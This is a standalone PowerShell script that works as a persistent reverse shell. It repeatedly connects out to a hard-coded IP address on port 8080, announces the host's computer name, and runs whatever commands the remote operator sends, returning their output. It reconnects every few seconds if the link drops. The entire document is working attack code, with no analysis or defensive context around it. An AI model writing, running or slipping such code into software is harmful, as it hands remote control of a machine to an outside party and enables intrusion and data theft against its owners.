$remoteHost  = '172.232.4.233'
$remotePort  = 8080
$retryDelay  = 5   # seconds between reconnect attempts

while ($true) {
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($remoteHost, $remotePort)
    } catch {
        $client.Dispose()
        Start-Sleep -Seconds $retryDelay
        continue
    }

    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::ASCII)
    $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::ASCII)
    $writer.AutoFlush = $true

    try {
        $writer.WriteLine("Connected from $($env:COMPUTERNAME)")
        while ($client.Connected) {
            $writer.Write("PS> ")
            $writer.Flush()

            $line = $reader.ReadLine()
            if ($null -eq $line) { break }      # remote closed the connection

            $command = $line.Trim()
            if ($command -eq '')    { continue }
            if ($command -ieq 'exit') { break }

            try {
                $tokens = $command -split '\s+'
                $cmd    = $tokens[0]
                $argList = if ($tokens.Length -gt 1) { $tokens[1..($tokens.Length - 1)] } else { @() }
                $output = (& $cmd @argList 2>&1 | Out-String)
            } catch {
                $output = "ERROR: $($_.Exception.Message)`r`n"
            }

            if ($output) { $writer.Write($output) }
        }
    } catch {
        # connection reset — fall through and reconnect
    } finally {
        try { $reader.Close() } catch {}
        try { $writer.Close() } catch {}
        try { $stream.Close() } catch {}
        try { $client.Close() } catch {}
    }

    Start-Sleep -Seconds $retryDelay
}
